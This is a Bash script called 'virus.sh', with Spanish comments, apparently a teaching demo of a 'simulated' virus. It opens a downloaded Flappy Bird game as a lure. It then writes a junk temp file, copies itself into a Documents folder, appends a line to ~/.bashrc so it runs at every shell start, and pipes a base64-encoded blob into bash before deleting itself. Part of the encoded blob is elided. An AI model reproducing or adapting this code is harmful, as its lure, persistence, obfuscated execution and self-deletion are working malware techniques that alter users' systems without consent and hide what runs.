#!/bin/bash

# Directorio donde se almacenará el juego
GAME_DIR="$HOME/flappy_bird_game"
# URL del repositorio de Flappy Bird
REPO_URL="https://github.com/nebez/floppybird"
# Archivo temporal para el payload simulado
TEMP_FILE="/tmp/infectado.txt"
# Directorio de propagación
PROPAGATION_DIR="$HOME/Documents/Infectados"
# Nombre del script
SCRIPT_NAME="virus.sh"
# Ruta completa del script
SCRIPT_PATH="$(realpath "$0")"

# Función para descargar el juego
download_game() {
    mkdir -p "$GAME_DIR"
    cd "$GAME_DIR" || exit
    # Descargar index.html
    curl -O "$REPO_URL/raw/gh-pages/index.html"
    # Descargar carpeta assets
    curl -L "$REPO_URL/trunk/assets/" -o assets.zip
    unzip assets.zip -d .
    rm assets.zip
}

# Función para abrir el juego en el navegador
open_game() {
    if [[ -f "$GAME_DIR/index.html" ]]; then
        if command -v xdg-open > /dev/null; then
            xdg-open "$GAME_DIR/index.html"
        elif command -v open > /dev/null; then
            open "$GAME_DIR/index.html"
        else
            echo "Por favor, abre $GAME_DIR/index.html en tu navegador manualmente."
        fi
    else
        echo "El juego no se encontró. Descargándolo..."
        download_game
        open_game
    fi
}

# Payload Simulado: Llenar un archivo temporal con texto aleatorio
payload_simulado() {
    echo "Generando payload simulado..."
    for i in {1..100}; do
        echo "Texto aleatorio $RANDOM" >> "$TEMP_FILE"
    done
}

# Propagación Simulada: Copiar el script a otra carpeta
propagacion_simulada() {
    echo "Realizando propagación simulada..."
    mkdir -p "$PROPAGATION_DIR"
    cp "$SCRIPT_PATH" "$PROPAGATION_DIR/"
}

# Persistencia Simulada: Agregar entrada al inicio del sistema
persistencia_simulada() {
    echo "Configurando persistencia simulada..."
    local bashrc="$HOME/.bashrc"
    local entry="bash $PROPAGATION_DIR/$SCRIPT_NAME # Inicio del script malicioso"
    if ! grep -Fxq "$entry" "$bashrc"; then
        echo "$entry" >> "$bashrc"
    fi
}

# Ofuscación: Decodificar y ejecutar parte del script en Base64
ofuscacion() {
    echo "Ejecutando parte ofuscada del script..."
    local script_b64="ZWNobyAiU29tZXRpbWVzIG9mdXNjYXRpb24gc2UgdXRpbGl6YSBwYXJhIGV2aWRpciBkZXRlY3
    ...
    0aW9uZXMiCg=="
    echo "$script_b64" | base64 --decode | bash
}

# Autodestrucción: Eliminar el script después de ejecutarse
autodestruccion() {
    echo "Autodestrucción en curso..."
    rm -- "$SCRIPT_PATH"
}

# Función principal
main() {
    echo "¡Tu sistema está infectado! 😈"
    open_game
    payload_simulado
    propagacion_simulada
    persistencia_simulada
    ofuscacion
    autodestruccion
}

# Ejecutar función principal
main
